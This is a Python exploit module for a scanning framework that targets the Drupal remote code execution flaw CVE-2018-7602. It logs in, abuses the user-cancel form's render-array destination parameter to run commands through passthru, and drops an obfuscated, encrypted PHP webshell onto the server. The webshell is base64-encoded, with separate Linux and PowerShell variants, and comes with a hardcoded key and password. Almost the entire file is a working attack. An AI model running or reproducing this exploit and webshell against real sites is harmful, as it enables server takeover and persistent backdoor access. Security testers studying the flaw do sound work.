import re
from collections import OrderedDict
from bs4 import BeautifulSoup

from libs.pocstrike.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port, random_str
from libs.pocstrike.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from libs.pocstrike.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '3'
    version = '1'
    author = ''
    vulDate = '2021-04-30'
    createDate = '2021-04-30'
    updateDate = '2021-04-30'
    references = ['http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7602']
    name = 'Drupal remote code execute'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = 'Drupal 7.x and 8.x '
    vulType = VUL_TYPE.REMOTE_CODE_EXECUTE
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []
    install_requires = ["beautifulsoup4==4.9.3:bs4"]
    desc = '''
            A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being compromised.
        '''
    pocDesc = '''
            Incoming destination site、username、password
        '''

    def _options(self):
        opt = OrderedDict()
        opt["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        opt["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=True)
        return opt

    def _verify(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        vulkey = self.detect_drupal(self.url, self.get_option('username'), self.get_option('password'))
        if vulkey:
            result = {
                'Result': {
                    'target': '{0} has vulnerability'.format(self.url),
                    'vulkey': vulkey,
                }
            }
        return self.parse_output(output, result)

    def _attack(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        shell_name = self.pwn_drupal(self.url, self.get_option('username'), self.get_option('password'))
        if shell_name:
            result = {
                'Result': {
                    'target': self.url,
                    'webshell': self.url + '/' + shell_name,
                    'pass': 'rebeyond'
                }
            }

        return self.parse_output(output, result)

    def _shell(self):
        pass

    def parse_output(self, output, result):
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def detect_drupal(self, target, username, password):
        vulkey = random_str()
        function = "passthru"
        command = 'echo  ' + vulkey
        session = requests.Session()
        get_params = {'q': 'user/login'}
        post_params = {
            'form_id': 'user_login',
            'name': username,
            'pass': password,
            'op': 'Log in'
        }
        session.post(
            target,
            params=get_params,
            data=post_params,
            verify=False)
        get_params = {'q': 'user'}
        r = session.get(target,
                        params=get_params,
                        verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')
        if ("?q=" in user_id):
            user_id = user_id.split("=")[1]
        if (user_id):
            pass
        get_params = {'q': user_id + '/cancel'}
        r = session.get(target,
                        params=get_params,
                        verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_token = form.find('input', {'name': 'form_token'}).get('value')
        get_params = {
            'q':
            user_id + '/cancel',
            'destination':
            user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command
        }
        post_params = {
            'form_id': 'user_cancel_confirm_form',
            'form_token': form_token,
            '_triggering_element_name': 'form_id',
            'op': 'Cancel account'
        }
        r = session.post(
            target,
            params=get_params,
            data=post_params,
            verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_build_id = form.find('input', {
            'name': 'form_build_id'
        }).get('value')
        if form_build_id:
            get_params = {
                'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id
            }
            post_params = {'form_build_id': form_build_id}
            r = session.post(
                target,
                params=get_params,
                data=post_params,
                verify=False)
            if vulkey in r.text:
                return vulkey
            else:
                return None

    def pwn_drupal(self, target, username, password):
        shell_name = random_str() + '.php'
        function = "passthru"
        command_linux = 'echo PD9waHAgQGVycm9yX3JlcG9ydGluZyggMCApO3Nlc3Npb25fc3RhcnQoKTska2V5PSJlNDVlMzI5ZmViNWQ5MjViIjskX1NFU1NJT05bJ2snXT0ka2V5O3Nlc3Npb25fd3JpdGVfY2xvc2UoKTskcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTtpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKXskdD0iYmFzZTY0XyIuImRlY29kZSI7JHBvc3Q9JHQoJHBvc3QuIiIpO2ZvcigkaT0gMCA7JGk8c3RybGVuKCRwb3N0KTskaSsrKXskcG9zdFskaV09JHBvc3RbJGldXiRrZXlbJGkrIDEgJiAxNSBdO319ZWxzZXskcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsIkFFUzEyOCIsJGtleSk7fSRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOyRmdW5jPSRhcnJbIDAgXTskcGFyYW1zPSRhcnJbIDEgXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCl7ZXZhbCgkcC4iIik7fX1AY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTs/Pg== | base64 -d >' + shell_name
        command_windows = 'powershell.exe -command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'PAA/AHAAaABwACAAQABlAHIAcgBvAHIAXwByAGUAcABvAHIAdABpAG4AZwAoACAAMAAgACkAOwBzAGUAcwBzAGkAbwBuAF8AcwB0AGEAcgB0ACgAKQA7ACQAawBlAHkAPQAiAGUANAA1AGUAMwAyADkAZgBlAGIANQBkADkAMgA1AGIAIgA7ACQAXwBTAEUAUwBTAEkATwBOAFsAJwBrACcAXQA9ACQAawBlAHkAOwBzAGUAcwBzAGkAbwBuAF8AdwByAGkAdABlAF8AYwBsAG8AcwBlACgAKQA7ACQAcABvAHMAdAA9AGYAaQBsAGUAXwBnAGUAdABfAGMAbwBuAHQAZQBuAHQAcwAoACIAcABoAHAAOgAvAC8AaQBuAHAAdQB0ACIAKQA7AGkAZgAoACEAZQB4AHQAZQBuAHMAaQBvAG4AXwBsAG8AYQBkAGUAZAAoACcAbwBwAGUAbgBzAHMAbAAnACkAKQB7ACQAdAA9ACIAYgBhAHMAZQA2ADQAXwAiAC4AIgBkAGUAYwBvAGQAZQAiADsAJABwAG8AcwB0AD0AJAB0ACgAJABwAG8AcwB0AC4AIgAiACkAOwBmAG8AcgAoACQAaQA9ACAAMAAgADsAJABpADwAcwB0AHIAbABlAG4AKAAkAHAAbwBzAHQAKQA7ACQAaQArACsAKQB7ACQAcABvAHMAdABbACQAaQBdAD0AJABwAG8AcwB0AFsAJABpAF0AXgAkAGsAZQB5AFsAJABpACsAIAAxACAAJgAgADEANQAgAF0AOwB9AH0AZQBsAHMAZQB7ACQAcABvAHMAdAA9AG8AcABlAG4AcwBzAGwAXwBkAGUAYwByAHkAcAB0ACgAJABwAG8AcwB0ACwAIgBBAEUAUwAxADIAOAAiACwAJABrAGUAeQApADsAfQAkAGEAcgByAD0AZQB4AHAAbABvAGQAZQAoACcAfAAnACwAJABwAG8AcwB0ACkAOwAkAGYAdQBuAGMAPQAkAGEAcgByAFsAIAAwACAAXQA7ACQAcABhAHIAYQBtAHMAPQAkAGEAcgByAFsAIAAxACAAXQA7AGMAbABhAHMAcwAgAEMAewBwAHUAYgBsAGkAYwAgAGYAdQBuAGMAdABpAG8AbgAgAF8AXwBpAG4AdgBvAGsAZQAoACQAcAApAHsAZQB2AGEAbAAoACQAcAAuACIAIgApADsAfQB9AEAAYwBhAGwAbABfAHUAcwBlAHIAXwBmAHUAbgBjACgAbgBlAHcAIABDACgAKQAsACQAcABhAHIAYQBtAHMAKQA7AD8APgA=\')) | out-file -Encoding utf8 "' + shell_name
        session = requests.Session()
        get_params = {'q': 'user/login'}
        post_params = {
            'form_id': 'user_login',
            'name': username,
            'pass': password,
            'op': 'Log in'
        }
        session.post(
            target,
            params=get_params,
            data=post_params,
            verify=False)
        get_params = {'q': 'user'}
        r = session.get(target,
                        params=get_params,
                        verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')
        if ("?q=" in user_id):
            user_id = user_id.split("=")[1]
        if (user_id):
            pass
        get_params = {'q': user_id + '/cancel'}
        r = session.get(target,
                        params=get_params,
                        verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_token = form.find('input', {'name': 'form_token'}).get('value')
        get_params_linux = {
            'q':
            user_id + '/cancel',
            'destination':
            user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command_linux
        }
        get_params_windows = {
            'q':
            user_id + '/cancel',
            'destination':
            user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command_windows
        }
        post_params = {
            'form_id': 'user_cancel_confirm_form',
            'form_token': form_token,
            '_triggering_element_name': 'form_id',
            'op': 'Cancel account'
        }
        r = session.post(
            target,
            params=get_params_linux,
            data=post_params,
            verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_build_id = form.find('input', {
            'name': 'form_build_id'
        }).get('value')
        if form_build_id:
            get_params = {
                'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id
            }
            post_params = {'form_build_id': form_build_id}
            r = session.post(
                target,
                params=get_params,
                data=post_params,
                verify=False)
            r = requests.get(target + '/' + shell_name)
            if r.status_code == 200:
                return shell_name
            else:
                r = session.post(
                    target,
                    params=get_params_windows,
                    data=post_params,
                    verify=False)
                soup = BeautifulSoup(r.text, "html.parser")
                form = soup.find('form', {'id': 'user-cancel-confirm-form'})
                form_build_id = form.find('input', {
                    'name': 'form_build_id'
                }).get('value')
                if form_build_id:
                    get_params = {
                        'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id
                    }
                    post_params = {'form_build_id': form_build_id}
                    r = session.post(
                        target,
                        params=get_params,
                        data=post_params,
                        verify=False)
                r = requests.get(target + '/' + shell_name)
                if r.status_code == 200:
                    return shell_name
                else:
                    return None


def other_fuc():
    pass


def other_utils_func():
    pass


register_poc(DemoPOC)
